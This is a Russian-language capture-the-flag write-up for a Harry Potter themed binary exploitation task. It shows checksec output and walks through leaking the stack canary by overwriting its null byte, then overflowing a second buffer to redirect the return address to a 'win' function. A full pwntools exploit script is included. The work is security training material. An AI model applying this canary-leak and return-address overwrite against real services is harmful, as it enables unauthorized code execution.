# Феникс

В Министерстве Магии внедрили новый сервис поддержки для обработки жалоб от сотрудников Хогвартса.
Система написана на древнем маггловском языке C и крутится на сервере в Отделе Тайн.

Чтобы защититься от тёмных искусств, разработчики посадили внутрь программы канарейку.
Говорят, если канарейка погибнет - процесс немедленно вызывает мракоборца. Эта канарейка была выбрана потому, что очень хотела стать фениксом, и научилась перерождаться из пепла после каждой смерти.

Поскольку канарейка перерождалась, считалось что система абсолютно безопасна - она будет всегда доступна, потому что канарейка будет жить дальше, но в моменты опасности канарейка будет погибать и вызывать мракоборца.

Ваша цель — доказать обратное и добыть флаг из глубин Отдела Тайн Министерства Магии. Удачи!

- Рекомендуемые утилиты: Ghidra, GDB, Python (pwntools).
- Цель работы: исследование бинарного файла и восстановление логики его работы.
- Итог работы: получение доступа к флагу.
- Критерий оценки: предоставление правильного флага.

## Решение

Посмотрим на бинарный файл с помощью `pwn checksec`:

```sh
justmarfix@justpc: ~/infosec/pwn10
$ pwn checksec support
[*] '/home/justmarfix/infosec/pwn10/support'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

Откроем исполняемый файл в Ghidra и перейдём в функцию `submit_ticket`.

<img src="./pictures/ghidra.png" alt="Функция main" width="500"/>

В ней в буфер `local_58` (`rbp - 0x50`) читается 0x50 байт. Вспомним, что канарейка находится в последних 8 байтах стека (`rbp - 0x8`) и заканчивается нулевым байтом. Перепишем этот нулевой байт (для нас он будет первым, а не последним, т.к. число будет храниться в Little Endian), чтобы прочесть канарейку при выводе `User: ...`.

После того, как мы прочтём канарейку, мы можем переписать буфер ещё раз (в `rbp - 0x70` читается 200 байт), оставляя канарейку на её месте. Адрес возврата перепишем на функцию `win`.

Код эксплоита:

```py
from pwn import ELF, p64, process

e = ELF("./support")
p = process(e.path)
win_addr = e.sym["win"]

p.send(b"A" * (0x50 - 0x8 + 1))
p.recvuntil(b"summary:\n")
p.recvuntil(b"A" * (0x50 - 0x8 + 1))

canary = b"\x00" + p.recv(7)
print("Canary:", canary)

p.send(b"B" * (0x70 - 0x8) + canary + b"A" * 8 + p64(win_addr))
print(p.recvall())
```
